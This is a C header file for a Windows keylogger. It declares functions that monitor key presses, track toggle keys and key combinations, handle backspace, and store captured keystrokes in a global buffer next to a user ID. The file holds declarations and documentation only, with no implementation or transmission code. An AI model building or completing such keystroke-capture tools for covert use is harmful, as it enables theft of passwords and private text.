#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include "hash-tables/Keys.h"
#include "hash-tables/PressedKeys.h"
#include "hash-tables/KeysCombinations.h"
#include "sets/Set.h"

extern char* result;
extern char* userId;

/**
 * @brief Starts monitoring keyboard input and triggers actions based on key states and combinations.
 *
 * @param pressedKeys Pointer to a PressedKeys structure for tracking pressed keys and their timing control.
 * @param keys Pointer to a Keys structure containing all key definitions to monitor.
 * @param combinations Pointer to a KeysCombinations structure holding key combination mappings.
 * @param set Pointer to a Set structure used to temporarily track currently active keys.
 */
void start(PressedKeys* pressedKeys, Keys* keys, KeysCombinations*, Set* set);

/**
 * @brief Verifies the state of special toggle keys like CAPS_LOCK or NUM_LOCK.
 *
 * @param keyName Pointer to a null-terminated string, which is a pressed key.
 * @param set Pointer to a Set structure used to temporarily track currently active keys.
 * @param pressedKeys Pointer to a PressedKeys structure for tracking pressed keys and their timing control.
 */
void verifySpecialKeyState(const char *keyName, PressedKeys *pressedKeys, Set* set);

/**
 * @brief Triggers an action when a key is detected as newly pressed or due for repeat and saves it into a buffer.
 *        Implemented logic prevents "hypersensitivity" of the keylogger causing repetition of pressed keys.
 *
 * @param keyName Pointer to a null-terminated string, which is a pressed key.
 * @param set Pointer to a Set structure used to temporarily track currently active keys.
 * @param pressedKeys Pointer to a PressedKeys structure for tracking pressed keys and their timing control.
 */
void triggerInvoked(const char *keyName, Set *set, PressedKeys *pressedKeys);

/**
 * @brief Handles the behavior of the Backspace key by modifying the result buffer.
 *        Implemented logic prevents "hypersensitivity" of the keylogger causing repetition of backspace operation.
 *
 * @param keyName Pointer to a null-terminated string, which is a pressed key.
 * @param set Pointer to a Set structure used to temporarily track currently active keys.
 * @param pressedKeys Pointer to a PressedKeys structure for tracking pressed keys and their timing control.
 */
void backspaceClick(const char *keyName, Set *set, PressedKeys *pressedKeys);

#endif
